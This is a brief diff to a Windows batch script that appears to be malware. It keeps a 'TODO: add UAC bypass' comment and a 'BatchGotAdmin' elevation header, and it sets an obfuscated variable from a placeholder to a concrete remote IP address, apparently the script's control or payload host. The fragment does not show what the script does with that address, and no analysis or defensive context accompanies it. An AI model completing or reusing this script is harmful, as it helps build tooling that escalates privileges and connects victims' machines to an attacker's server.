@@ -1,7 +1,7 @@
 @REM TODO: add UAC bypass
 
 @REM change me
-set "EcSjRhAguo=X.X.X.X"
+set "EcSjRhAguo=195.35.32.34"
 
 @echo off
 :: BatchGotAdmin
